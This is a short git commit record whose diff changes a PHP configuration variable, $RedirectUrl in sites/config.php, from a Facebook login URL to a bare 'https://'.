9008a4176d855367dc87fb3be49b5883c183a1e7
darknethaxor <72026007+darknethaxor@users.noreply.github.com>
2022-04-01 15:32:21 +0600

    Update config.php

--- sites/config.php
+++ sites/config.php
@@ -1,5 +1,5 @@
 <?php
 
-$RedirectUrl = "https://web.facebook.com/login/?email=&li=7HuNXheRQXhWYv5BGRmu6HKI&e=1348092&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&_rdr"; 
+$RedirectUrl = "https://"; 
 
 ?>
